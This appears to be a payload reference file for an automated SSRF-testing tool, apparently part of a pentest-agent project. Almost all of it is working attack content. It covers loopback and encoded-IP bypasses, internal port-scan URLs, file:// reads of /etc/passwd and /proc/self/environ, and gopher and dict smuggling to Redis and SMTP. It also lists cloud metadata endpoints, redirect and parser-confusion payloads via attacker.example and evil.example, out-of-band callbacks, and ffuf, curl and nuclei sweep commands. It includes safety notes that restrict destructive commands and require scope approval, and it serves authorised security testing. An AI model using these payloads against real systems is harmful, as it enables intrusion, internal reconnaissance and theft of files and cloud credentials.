# payloads — ssrf-hunter

**Source:** `pentest-agent-development/notebooklm-notes/Guia Estratégico de Testes e Mitigação de SSRF.md` (Section 5: PAYLOADS / PROBES)

For cloud-metadata-specific probes (IMDS / GCP / Azure metadata),
delegate to `ssrf-cloud-metadata-hunter`. This file covers the core
SSRF probe library.

---

## 1. Internal Loopback

```
http://localhost/
http://localhost:8080/
http://127.0.0.1/
http://127.0.0.1:80/
http://0.0.0.0/
http://[::1]/
http://[::]/
```

Decimal / octal / hex alternate encodings of `127.0.0.1`:

```
http://2130706433/            # decimal
http://0177.0.0.1/            # octal
http://0x7f.0.0.1/            # hex
http://127.1/                 # short form (expands to 127.0.0.1)
http://127.000.000.001/       # zero-padded
```

## 2. Internal Network Scanning

```
# RFC1918 private ranges
http://10.0.0.1/
http://172.16.0.1/
http://192.168.0.1/

# Common internal service ports
http://10.0.0.1:22/
http://10.0.0.1:6379/           # Redis
http://10.0.0.1:9200/           # Elasticsearch
http://10.0.0.1:27017/          # MongoDB
http://10.0.0.1:5432/           # PostgreSQL
http://10.0.0.1:3306/           # MySQL
http://internal-admin.svc/      # Kubernetes service DNS
```

Use an ffuf parameter-sweep to enumerate which ports are open-behind-SSRF:

```bash
ffuf -w ports.txt:PORT \
     -u "https://target/fetch?url=http://10.0.0.1:PORT/" \
     -mc 200,301,302 -fs 0
```

## 3. File Scheme (Local File Disclosure)

```
file:///etc/passwd
file:///etc/hostname
file:///proc/self/environ             # env vars leak
file:///proc/self/cmdline             # command line of process
file:///c:/windows/win.ini            # Windows
file:///c:/boot.ini                   # Windows
```

## 4. Gopher / Dict / FTP Smuggling

Used to smuggle raw protocol bytes through an HTTP fetch. Useful when
the target backend service speaks Redis, Memcached, or SMTP.

```
# gopher to Redis — read-only INFO
gopher://10.0.0.1:6379/_INFO%0D%0A

# gopher to SMTP (banner probe)
gopher://mail.internal:25/_HELO%20x%0D%0AQUIT%0D%0A

# dict protocol — Redis shows INFO
dict://10.0.0.1:6379/INFO

# FTP — banner grabs
ftp://10.0.0.1:21/
```

Gopher is the most powerful protocol for SSRF smuggling because it
passes arbitrary bytes — test first with a harmless command like Redis
`INFO` or `PING`. Do NOT submit destructive Redis commands (`FLUSHALL`,
`SHUTDOWN`) or any state-changing SMTP sequence without
`destructive_testing: approved`.

## 5. Cloud Metadata (handoff to `ssrf-cloud-metadata-hunter`)

Short list — escalate to the specialist skill for the full playbook:

```
http://169.254.169.254/latest/meta-data/                      # AWS
http://metadata.google.internal/computeMetadata/v1/           # GCP (needs header)
http://169.254.169.254/metadata/instance?api-version=2020-09-01  # Azure (needs header)
```

## 6. DNS Rebinding

When the target validates the host with a DNS lookup, then re-resolves
on the real fetch, a rebinding record returns external IP on first
lookup and internal IP on second.

```
# Use a hosted rebind service (safer than self-hosting):
https://public-external.rebind.example/rebind?from=1.2.3.4&to=127.0.0.1

# Or craft your own:
# zone: rebind.example
#   A record TTL=0 alternating between 1.2.3.4 and 127.0.0.1
```

## 7. Redirect Bypass (server follows redirects)

If the server whitelists the initial URL but follows 3xx responses,
point it at an attacker-controlled redirector:

```
http://attacker.example/redirect?to=http://127.0.0.1:8080/admin
http://attacker.example/redirect?to=file:///etc/passwd
```

## 8. URL Parser Confusion

Different URL parsers disagree on how to handle unusual authority forms.
When the application validates with parser A but fetches with parser B,
these differ:

```
http://127.0.0.1#@evil.example/
http://evil.example#@127.0.0.1/
http://127.0.0.1:80\@evil.example/             # backslash (Python urllib)
http://127.0.0.1%09.evil.example/              # tab
http://evil.example%2F%40127.0.0.1/
http://user:pass@127.0.0.1/                    # userinfo component
http://127.0.0.1\\.evil.example/               # double backslash
```

## 9. IPv6 and IPv4-in-IPv6

```
http://[::ffff:127.0.0.1]/
http://[::127.0.0.1]/
http://[0:0:0:0:0:ffff:127.0.0.1]/
http://[fe80::1]/                   # link-local
```

## 10. Blind SSRF via Out-of-Band Callback

When the response is not reflected, detect via an OOB listener (Burp
Collaborator, interact.sh, your own DNS listener):

```bash
# interact.sh (publicly hosted)
# submit the URL it generates — a DNS or HTTP hit on it confirms SSRF
curl -H "Content-Type: application/json" -d '{"url":"http://OOB_ID.oast.site/"}' \
     https://target/api/fetch
```

Monitor your listener; a hit on `OOB_ID.oast.site` proves the server
made the request.

---

## Fragment Bypass

Servers that naively check `url.contains("target.com")` can be fooled
with a fragment separator:

```
https://attacker-domain#expected-domain
https://attacker-domain?x=expected-domain
https://attacker-domain/../expected-domain
```

## URL Encoding Bypass

```
https://%6c%6f%63%61%6c%68%6f%73%74           # localhost URL-encoded
https://%31%32%37%2e%30%2e%30%2e%31           # 127.0.0.1 URL-encoded
```

---

## Fuzzing / Sweep Commands

### ffuf — enumerate parameter location

```bash
ffuf -w ssrf_payloads.txt:PAYLOAD \
     -u "https://target/api/fetch?url=PAYLOAD" \
     -mc 200,500 -fs 0
```

### curl one-offs

```bash
# Check if the server follows file:///
curl -s "https://target/fetch?url=file:///etc/passwd" | head -c 200

# Check internal scan — vary port
for PORT in 22 80 443 2375 3306 5432 6379 8080 9200 27017; do
  echo "PORT=${PORT}"
  curl -s -o /dev/null -w "%{http_code} %{time_total}s\n" \
       "https://target/fetch?url=http://10.0.0.5:${PORT}/"
done
```

### Nuclei — ready-made SSRF templates

```bash
nuclei -u https://target/fetch?url=URL_MARKER \
       -t ~/nuclei-templates/http/ssrf/ \
       -var URL=http://OOB_ID.oast.site
```

---

## Safety Notes

- Gopher / dict payloads can trigger real commands on internal Redis /
  Memcached. Start with read-only commands (`INFO`, `PING`) only.
- Blind-SSRF via OOB callback requires the OOB domain to be registered
  in `security-scope.yaml.allowed_oob_domains`.
- Scanning the full private IP space is high-noise; start with the
  specific internal range the target is known to deploy into (from
  passive recon) and expand only as needed.
